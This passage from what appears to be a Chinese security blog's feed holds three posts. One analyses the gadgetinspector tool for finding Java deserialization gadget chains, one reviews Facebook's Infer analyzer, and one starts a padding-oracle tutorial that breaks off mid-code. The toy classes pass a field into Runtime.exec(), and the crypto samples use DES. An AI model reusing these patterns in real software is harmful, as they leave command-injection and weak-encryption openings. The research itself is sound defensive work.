class="headerlink" title="Step3"></a>Step3</h2><p>构建调用图，即函数A将自身参数arg1传递给函数B的参数arg2 FuncA@1-&gt;FuncB@2</p><p><img src="/deserialize-AutoFindPOP/1566118496226.png" alt="1566118496226"></p><p>Output: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set&lt;GraphCall&gt; discoveredCalls</span><br><span class="line">GraphCall(caller.Method, targetMethod, callerArgIndex, callerargPath, targetArgIndex)</span><br><span class="line">// 调用函数, 被调函数, 调用函数传递参数idx，路径，被调函数传入参数idx</span><br></pre></td></tr></table></figure><p>构图时，只考虑存在污点的边：</p><p><img src="/deserialize-AutoFindPOP/1566215882715.png" alt="1566215882715"></p><p>这里发现gadgetinspector.TaintTrackingMethodVisitor#getStackTaint有点问题，每次get的时候并未拿到Taint</p><h2 id="Step4"><a href="#Step4" class="headerlink" title="Step4"></a>Step4</h2><p>枚举入口，如hashCode，toString，程序只能发现已知入口的POP链</p><p><img src="/deserialize-AutoFindPOP/1566120657753.png" alt="1566120657753"></p><p>Output：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Source&gt; discoveredSources</span><br><span class="line">Source(sourceMethod, taintedArgIndex) <span class="comment">//index0=this</span></span><br></pre></td></tr></table></figure><h2 id="Step5"><a href="#Step5" class="headerlink" title="Step5"></a>Step5</h2><p>BFS搜索图找到chains</p><p><img src="/deserialize-AutoFindPOP/1566302159606.png" alt="1566302159606"></p><h1 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h1><p>断点打gadgetinspector.GadgetInspector#main</p><h2 id="污点传播（Step2-Step3）"><a href="#污点传播（Step2-Step3）" class="headerlink" title="污点传播（Step2-Step3）"></a>污点传播（Step2-Step3）</h2><p>Step2-Step3都是通过ASM做的，例如Step3：</p><p><img src="/deserialize-AutoFindPOP/1566214430085.png" alt="1566214430085"></p><p>其中继承了基本Visitor：</p><p>gadgetinspector.TaintTrackingMethodVisitor，该类模拟函数执行，主要污点传播逻辑都在这</p><h3 id="visitMethodInsn"><a href="#visitMethodInsn" class="headerlink" title="visitMethodInsn"></a>visitMethodInsn</h3><p>字节码调用函数时会触发该函数，对于污点传播而言，应该做如下事情</p><ul><li>从堆栈取出参数</li><li>检查函数的参数是否存在污点</li><li>返回函数结果是否存在污点</li><li>将结果推入堆栈</li></ul><p>实际上就是模拟了一个函数的调用过程，如果函数中有嵌套调用那么情况会更复杂</p><p>其属性savedVariableState.StackVars记录着函数参数，及其是否有污点：</p><p><img src="/deserialize-AutoFindPOP/1567047086609.png" alt="1567047086609"></p><p>如上图，该函数（StringBuilder.append()）有两个参数，第一个参数是this，有污点，第二个参数无污点。</p><h3 id="特殊的传播"><a href="#特殊的传播" class="headerlink" title="特殊的传播"></a>特殊的传播</h3><p>在gadgetinspector.TaintTrackingMethodVisitor#PASSTHROUGH_DATAFLOW处定义了一些特殊的传播，保证污点能够向后传播，比如说String类型<code>A+Taint</code>的传播，idx1，idx2，idx3分别是类，函数名，函数签名，后面是能够传播的污点参数idx，如StringBuilder.append()会将参数0，参数1传播：</p><p><img src="/deserialize-AutoFindPOP/1566974563078.png" alt="1566974563078"></p><p>而gadgetinspector.TaintTrackingMethodVisitor#visitMethodInsn这里需要处理函数参数调用传播污点的情况，如<code>A(B(xxx))</code></p><h2 id="SINK点"><a href="#SINK点" class="headerlink" title="SINK点"></a>SINK点</h2><p>Sink点定义在gadgetinspector.GadgetChainDiscovery#isSink：</p><p><img src="/deserialize-AutoFindPOP/1566288878759.png" alt="1566288878759"></p><h2 id="判断该类是否可以反序列化"><a href="#判断该类是否可以反序列化" class="headerlink" title="判断该类是否可以反序列化"></a>判断该类是否可以反序列化</h2><p>对于java原生序列化，判断逻辑在：gadgetinspector.javaserial.SimpleSerializableDecider#applyNoCache，其他序列化方法找对应的包名。</p><h2 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h2><p>对于java原生序列化，逻辑在：gadgetinspector.javaserial.SimpleSerializableDecider#isBlacklistedClass，可以追加黑名单。</p><h1 id="程序的一个Issue"><a href="#程序的一个Issue" class="headerlink" title="程序的一个Issue"></a>程序的一个Issue</h1><p>原版污点传播存在一个Bug，考虑如下情况：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    String cmd;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getcmd</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> cmd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">func</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(getcmd());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里程序无法发现gadget，因为在读取getcmd()字节码后，污点传播执行如下代码（TaintTrackingMethodVisitor.java#L675）向外传播污点：</p><p><img src="/deserialize-AutoFindPOP/1566980149628.png" alt="1566980149628"></p><p>这一意思是说，如果passthroughDataflow（第二步）计算得到getcmd能够传播污点，那么该污点将作为参数推入堆栈（即传播到exec()函数参数上），但是这里的passthroughDataflow并没有B.getcmd()的记录，只有A.getcmd()记录——因为B.getcmd()继承A.getcmd()，因此污点传播中断了。</p><p>因此需要寻找其父类查看是否有该方法，将图中的代码块换成如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (passthroughDataflow != <span class="keyword">null</span>) &#123;</span><br><span class="line">    Set&lt;Integer&gt; passthroughArgs = passthroughDataflow.get(methodHandle);</span><br><span class="line">    <span class="keyword">if</span> (passthroughArgs == <span class="keyword">null</span> &amp;&amp; inheritanceMap!=<span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// FIXME ClassA-&gt;ClassB-&gt;ClassC</span></span><br><span class="line">        <span class="comment">//  ClassA.func(), ClassB.func(), ClassC.func()==ClassB.func()!=ClassA.func();</span></span><br><span class="line">        <span class="comment">//  now taint will passthrough if ClassB.func() or ClassA.func() can passthrough.</span></span><br><span class="line">        <span class="comment">//  So FP will arrise.</span></span><br><span class="line">        Set&lt;ClassReference.Handle&gt; superClasses=inheritanceMap.getSuperClasses(clzHandle);</span><br><span class="line">        <span class="keyword">if</span>(superClasses!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span> (ClassReference.Handle superClzHandle: superClasses)&#123;</span><br><span class="line">                List&lt;Set&lt;Integer&gt;&gt; list=passthroughDataflow.entrySet().stream()</span><br><span class="line">                        .filter(e-&gt;(e.getKey().getClassReference().equals(superClzHandle)</span><br><span class="line">                                &amp;&amp; e.getKey().getName().equals(name)</span><br><span class="line">                                &amp;&amp; e.getKey().getDesc().equals(desc)))</span><br><span class="line">                        .map(e-&gt;e.getValue())</span><br><span class="line">                        .collect(Collectors.toList());</span><br><span class="line">                <span class="keyword">if</span>(!list.isEmpty())&#123;</span><br><span class="line">                    passthroughArgs=list.get(<span class="number">0</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (passthroughArgs != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> arg : passthroughArgs) &#123;</span><br><span class="line">            resultTaint.addAll(argTaint.get(arg));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这样就还存在一个问题，因为gadgetinspector.data.InheritanceMap#getSuperClasses返回的是一个集合，因此，我们并没法知道真实调用exec()的是哪一个函数：</p><p><img src="/deserialize-AutoFindPOP/1566981439728.png" alt="1566981439728"></p><p>考虑如下例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    String cmd;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getcmd</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> cmd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getcmd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"whoami"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> <span class="keyword">extends</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">func</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(getcmd());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里，前面的代码会返回getcmd()传播污点——父类的任意一个getcmd()能传污点就有污点，但是实际上其并没有污点，因为实际上getcmd()调用的是B.getcmd()，因此会产生误报，预计使用接口的话这一点会更加明显。</p><h1 id="缺陷"><a href="#缺陷" class="headerlink" title="缺陷"></a>缺陷</h1><ul><li><p>无视控制流，导致误报</p></li><li><p>无法识别反射的SINK点，导致漏报</p></li></ul><p><strong>相关代码：</strong><a href="https://github.com/Anemone95/gadgetinspector" target="_blank" rel="noopener">https://github.com/Anemone95/gadgetinspector</a></p><h1 id="附录：ASM源码"><a href="#附录：ASM源码" class="headerlink" title="附录：ASM源码"></a>附录：ASM源码</h1><p>其污点传播用ASM做的，因此记一下关于ASM的一些使用方法</p><h2 id="ClassReader"><a href="#ClassReader" class="headerlink" title="ClassReader"></a>ClassReader</h2><h2 id="ClassVisitor"><a href="#ClassVisitor" class="headerlink" title="ClassVisitor"></a>ClassVisitor</h2><p>定义在读取Class字节码时会触发的事件，如类头解析完成、注解解析、字段解析、方法解析等。</p><h2 id="MethodVisitor"><a href="#MethodVisitor" class="headerlink" title="MethodVisitor"></a>MethodVisitor</h2><p>定义在解析方法时触发的事件，如方法上的注解、属性、代码等。这里只是操作码不含操作数</p><p>visitInsn：IALOAD~SALOAD触发该函数</p><p>visitVarInsn(opcode, var)：ILOAD~ALOAD触发该函数，var为操作数</p><p>B4 getfield</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;文章来自Automated Discovery of Deserialization Gadget Chains, Blackhat2018&lt;/p&gt;
&lt;p&gt;文章：&lt;a href=&quot;https://i.blackhat.com/us-18/Thu-August-9/us-18
      
    
    </summary>
    
      <category term="Web安全-反序列化" scheme="http://anemone.top/categories/Web%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
      <category term="反序列化" scheme="http://anemone.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="Javam" scheme="http://anemone.top/tags/Javam/"/>
    
      <category term="自动化" scheme="http://anemone.top/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
    
      <category term="污点传播" scheme="http://anemone.top/tags/%E6%B1%A1%E7%82%B9%E4%BC%A0%E6%92%AD/"/>
    
  </entry>
  
  <entry>
    <title>Infer试用以及扫描原理分析</title>
    <link href="http://anemone.top/whitebox-infer/"/>
    <id>http://anemone.top/whitebox-infer/</id>
    <published>2019-08-24T01:27:49.000Z</published>
    <updated>2019-09-22T10:14:18.706Z</updated>
    
    <content type="html"><![CDATA[<p>Infer作为facebook 开源的使用 ocaml 开发静态代码检测工具，作为公司的产品调研对象，本文就其使用和原理两方面进行分析。</p><p>GitHub：<a href="https://github.com/facebook/infer" target="_blank" rel="noopener">https://github.com/facebook/infer</a></p><p>教程：<a href="https://infer.liaohuqiu.net/" target="_blank" rel="noopener">https://infer.liaohuqiu.net/</a></p><h1 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Gradle</span></span><br><span class="line">infer -- gradle &lt;gradle task, e.g. <span class="string">"build"</span>&gt;</span><br><span class="line">infer -- ./gradlew &lt;gradle task, e.g. <span class="string">"build"</span>&gt;</span><br><span class="line"><span class="comment"># Maven</span></span><br><span class="line">infer -- mvn &lt;maven target&gt;</span><br></pre></td></tr></table></figure><h1 id="检测能力"><a href="#检测能力" class="headerlink" title="检测能力"></a>检测能力</h1><p>官网上看到能够检测到的问题有：</p><p>Java：</p><ul><li>Resource Leak</li><li>Null dereference</li></ul><p>C and Objective-C</p><ul><li>Resource leak</li><li>Memory leak</li><li>Null dereference</li><li>Parameter not null checked</li><li>Ivar not null checked</li><li>Premature nil termination argument</li></ul><p>Bugs reported only in Objective-C</p><ul><li>Retain cycle</li></ul><p>参见：<a href="https://infer.liaohuqiu.net/docs/infer-bug-types.html" target="_blank" rel="noopener">https://infer.liaohuqiu.net/docs/infer-bug-types.html</a></p><p>但是定位到源代码：<a href="https://github.com/facebook/whitebox-infer/blob/master/whitebox-infer/src/base/IssueType.ml后，发现其还能检测其存在注入类型的漏洞，不知为何没有扫描到。" target="_blank" rel="noopener">https://github.com/facebook/whitebox-infer/blob/master/whitebox-infer/src/base/IssueType.ml后，发现其还能检测其存在注入类型的漏洞，不知为何没有扫描到。</a></p><h1 id="试用"><a href="#试用" class="headerlink" title="试用"></a>试用</h1><p>Webgoat检测到16个问题，14个空引用和2个资源泄露：</p><p><img src="/whitebox-infer/1566373102585.png" alt="1566373102585"></p><p>扫描InsecureBankv2:</p><p><img src="/whitebox-infer/1566370930925.png" alt="1566370930925"></p><h1 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h1><ul><li><p>增量分析</p></li><li><p>能够分析大规模程序</p></li></ul><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p><a href="https://infer.liaohuqiu.net/docs/separation-logic-and-bi-abduction.html" target="_blank" rel="noopener">分离逻辑（separation logic）和双向假说推理（bi-abduction）</a>，<a href="https://en.wikipedia.org/wiki/Hoare_logic" target="_blank" rel="noopener">霍尔逻辑</a>和<a href="https://en.wikipedia.org/wiki/Abstract_interpretation" target="_blank" rel="noopener">抽象解释</a>，分离逻辑用来检测bug，双向假说推理用来做增量分析。</p><h2 id="分离逻辑"><a href="#分离逻辑" class="headerlink" title="分离逻辑"></a>分离逻辑</h2><p>一开始用于内存管理的逻辑</p><script type="math/tex; mode=display">x\mapsto y * y\mapsto x</script><p>$x \mapsto y$ 指指针x指向值y（x points to y），$A*B$指A和B处于分离的两块内存中（and separately），因此以上公式被叫做（x 指向y，同时y指向x），可以用下图表示：</p><p><img src="/whitebox-infer/SepSplit.jpg" alt="static/images/SepSplit.jpg"></p><p>接着使用Hoare三元组${pre}prog{post}$，表示程序行为，$pre$指前置条件，$prog$指程序片段$post$为后置条件。例如使用Hoare三元组描述一个关闭资源的函数：</p><script type="math/tex; mode=display">\{r\mapsto open\}closeResource(r)\{r\mapsto closed\}(spec)</script><p>它说明，一个正确的关闭资源的函数运行前，r资源应该是打开的，运行后r资源应该是关闭的，如果不符合则代码有问题。</p><p>那么若有两个资源$r_1$和$r_2$仅关闭$r_1$可以表示成：</p><script type="math/tex; mode=display">\{r_1\mapsto open * r_2\mapsto open\}closeResource(r_1)\{r_1\mapsto closed * r_2\mapsto open\}(use)</script><p>这里使用了一个小规范（spec）去更新了一个大规范（use），更一般的，我们有：</p><script type="math/tex; mode=display">\{pre\}prog\{post\}\rightarrow\{pre*frame\}prog\{post*frame\}</script><p>这一规则也被称为逻辑分离中的frame规则，$frame$描述了不变的状态，属于来自于就像动画场景中背景（frame）——动画场景中背景不会变。</p><p>这一规则用于数学推理，它揭示了逻辑推理应该聚焦于程序访问资源的那一块逻辑，并且分离的两块可以独立分析。</p><h2 id="双向假说推理"><a href="#双向假说推理" class="headerlink" title="双向假说推理"></a>双向假说推理</h2><p>A推出B表示为：</p><script type="math/tex; mode=display">A \vdash B</script><p>在传统逻辑推理中，一个推理问题被定义为：</p><ul><li><p>给定假设A和目标G</p></li><li><p>找到一个M，使如下公式成立：</p><script type="math/tex; mode=display">A \land M \vdash G</script></li></ul><p>应用到分离逻辑问题，即：</p><script type="math/tex; mode=display">A * M \vdash G</script><p>双向假说推理将问题拓展成：</p><script type="math/tex; mode=display">A*?antiframe \vdash G*?frame</script><p>即infer需要找到一对$antiframe$和$frame$让上式成立。</p><p>这在做增量扫描是很重要。</p><p>为了说明问题，例如我们有如下函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">lst_nd* <span class="title">q</span><span class="params">(lst_nd *y)</span> </span>&#123; <span class="comment">// Inferred Pre: list(y) </span></span><br><span class="line">    lst_nd *x, *z;</span><br><span class="line">    x=<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(lst_nd)); x-&gt;tail=<span class="number">0</span>;</span><br><span class="line">    z=<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(lst_nd)); z-&gt;tail=<span class="number">0</span>; <span class="comment">// Abducted: list(y), Framed: z|-&gt;0 </span></span><br><span class="line">    merge(x,y); <span class="comment">// Obtained Post: list(x)*z|-&gt;0 </span></span><br><span class="line">    merge(x,z); <span class="comment">// Obtained Post: list(x) </span></span><br><span class="line">    <span class="keyword">return</span>(x);</span><br><span class="line">&#125; <span class="comment">// Inferred Post: list(ret)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(lst_nd *x,lst_nd *y)</span></span>&#123;<span class="comment">//SUMMARY ONLY </span></span><br><span class="line">    <span class="comment">// Given Pre: list(x) * list(y)</span></span><br><span class="line">    <span class="comment">// x=x+y</span></span><br><span class="line">&#125; <span class="comment">// Given Post: list(x)</span></span><br></pre></td></tr></table></figure><p>要分析merge有没有空指针，有</p><script type="math/tex; mode=display">\{x\mapsto list * y\mapsto list\}merge(x,y)\{x\mapsto list\}</script><p>如果开始分析q到第5行，我们有：</p><script type="math/tex; mode=display">A=x\mapsto 0 *z \mapsto 0</script><p>但是我们的前提条件是$G=x\mapsto list * y\mapsto list$那么开始推导：</p><script type="math/tex; mode=display">x\mapsto0 *z \mapsto 0 * ?antiframe \vdash x\mapsto list * y \mapsto list * ?frame</script><p>因此 $antiframe=y\mapsto list$且$frame=z\mapsto 0$，这说明，如果想要分析q()函数有没有空指针，那么我们现在只需要分析$y\mapsto list$是成立就行了。</p><p><strong>这意味着，如果将来发新版本，若q()函数不变，则不需要再分析该函数，只需要分析改变的那些函数有没有改变$y \mapsto list$即可。</strong></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Infer目前的检测能力只局限于空指针和数据泄露问题，然而在检测项中发现了更多，怀疑是开源的是缩水的版本，而其增量分析的思想值得扫描器借鉴，其可用来完成commit级别的SAST和Serveless的安全检测。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Infer作为facebook 开源的使用 ocaml 开发静态代码检测工具，作为公司的产品调研对象，本文就其使用和原理两方面进行分析。&lt;/p&gt;
&lt;p&gt;GitHub：&lt;a href=&quot;https://github.com/facebook/infer&quot; target=&quot;_b
      
    
    </summary>
    
      <category term="源码安全" scheme="http://anemone.top/categories/%E6%BA%90%E7%A0%81%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="源码安全" scheme="http://anemone.top/tags/%E6%BA%90%E7%A0%81%E5%AE%89%E5%85%A8/"/>
    
      <category term="C/C++" scheme="http://anemone.top/tags/C-C/"/>
    
      <category term="Infer" scheme="http://anemone.top/tags/Infer/"/>
    
  </entry>
  
  <entry>
    <title>PaddingOracle攻击</title>
    <link href="http://anemone.top/crypto-PaddingOracle%E6%94%BB%E5%87%BB/"/>
    <id>http://anemone.top/crypto-PaddingOracle攻击/</id>
    <published>2019-07-15T12:30:49.000Z</published>
    <updated>2019-09-22T10:14:18.584Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CBC加密原理"><a href="#CBC加密原理" class="headerlink" title="CBC加密原理"></a>CBC加密原理</h1><p>先预习下CBC的加解密原理吧。</p><h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><p>如下图所示，CBC的加密步骤如下：</p><ol><li>对明文分组，每组长度通常为8或16字节，末尾分组需要填充，通常填充采用PKCS#5标准；</li><li>生成初始化向量IV，长度为分组长度；</li><li>对于第一个明文分组，先由IV异或明文分组1得到中间值，再通过对称加密（DES/AEC/etc）得到密文分组1；</li><li>对于接下来的分组，由上一个密文分组替代IV算得中间值，再通过对称加密（DES/AEC/etc）得到密文分组2,3,4……</li></ol><p><img src="/crypto-PaddingOracle攻击/1563006823645.png" alt="加密"></p><p>给出加密的Java代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">encrypt</span><span class="params">(String plain, String key)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] keyBytes = key.getBytes(charset);</span><br><span class="line">    <span class="keyword">byte</span>[] plainBytes = plain.getBytes(charset);</span><br><span class="line">    SecretKeySpec keySpec = <span class="keyword">new</span> SecretKeySpec(keyBytes, <span class="string">"DES"</span>);</span><br><span class="line">    Cipher cipher = Cipher.getInstance(<span class="string">"DES/CBC/PKCS5Padding"</span>);<span class="comment">//"算法/模式/补码方式"</span></span><br><span class="line">    cipher.init(Cipher.ENCRYPT_MODE, keySpec);</span><br><span class="line">    <span class="keyword">byte</span>[] iv = cipher.getIV();</span><br><span class="line">    <span class="keyword">byte</span>[] encrypted = cipher.doFinal(plain.getBytes(charset));</span><br><span class="line">    <span class="keyword">return</span> bytes2HexStr(iv)+<span class="string">"::"</span>+bytes2HexStr(encrypted);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，算法输入是明文（plain）和密钥（key），返回是初始化向量（iv）和加密后的密文（encrypted）。</p><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p>如下图所示，CBC的解密步骤如下：</p><ol><li>将密文分组；</li><li>对于第一个密文分组，先经过对称加密算法解密得到中间值，再由初始化向量IV异或中间值得到明文分组1；</li><li>对于接下来的密文分组，由经过对称加密算法解密得到中间值，再上一个密文分组代替IV异或得到明文分组2,3,4……；</li></ol><p><img src="/crypto-PaddingOracle攻击/1563012736837.png" alt="1563012736837"></p><p>给出Java版解密代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">decrypt</span><span class="params">(String secret, String key, String iv)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] keyBytes = key.getBytes(charset);</span><br><span class="line">    <span class="keyword">byte</span>[] secretBytes = hexStr2Bytes(secret);<span class="comment">//先用base64解密</span></span><br><span class="line">    <span class="keyword">byte</span>[] ivBytes = hexStr2Bytes(iv);</span><br><span class="line"></span><br><span class="line">    IvParameterSpec ivs = <span class="keyword">new</span> IvParameterSpec(ivBytes);</span><br><span class="line">    SecretKeySpec keySpec = <span class="keyword">new</span> SecretKeySpec(keyBytes, <span class="string">"DES"</span>);</span><br><span class="line">    Cipher cipher = Cipher.getInstance(<span class="string">"DES/CBC/PKCS5Padding"</span>);</span><br><span class="line">    cipher.init(Cipher.DECRYPT_MODE, keySpec, ivs);</span><br><span class="line">    <span class="keyword">byte</span>[] plain = cipher.doFinal(secretBytes);</span><br><span class="line">    String plainString = <span class="keyword">new</span> String(plain,charset);</span><br><span class="line">    <span class="keyword">return</span> plainString;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见输入是密文（secret）、密码（key）、初始化向量（iv）——这正与加密的输入对应，输出是明文（plainString）。</p><h2 id="PKCS-5填充方案"><a href="#PKCS-5填充方案" class="headerlink" title="PKCS#5填充方案"></a>PKCS#5填充方案</h2><p>这里再提一下PKCS#5方案，简单说就是缺多少位补多少，补内容就是缺位数的int值，例如：需要加密的串为“FIG”，而分组长度为8，那么缺5位，因此补完为“FIG\x05\x05\x05\x05\x05”，注意即使长度正巧为8，也需要补上一个完整分组，以检查加密正确性。</p><p><img src="/crypto-PaddingOracle攻击/1999562-43a6dede0db2bd18.png" alt="img"></p><p>在解密完最后一个分组后，先会检查Padding是否合法（注意，这是发起Oracle Padding攻击的关键）</p><p>com.sun.crypto.provider.CipherCore#unpad():</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">unpad</span><span class="params">(<span class="keyword">int</span> len, <span class="keyword">byte</span>[] intermidVal)</span> <span class="keyword">throws</span> BadPaddingException </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="keyword">this</span>.padding.unpad(intermidVal, <span class="number">0</span>, len);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> BadPaddingException(<span class="string">"Given final block not properly padded. Such issues can arise if a bad key is used during decryption."</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>com.sun.crypto.provider.PKCS5Padding#unpad():</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> plain 解密字符串</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> startIdx 开始下标</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> length 字符串长度</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> paddingVal</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">unpad</span><span class="params">(<span class="keyword">byte</span>[] plain, <span class="keyword">int</span> startIdx, 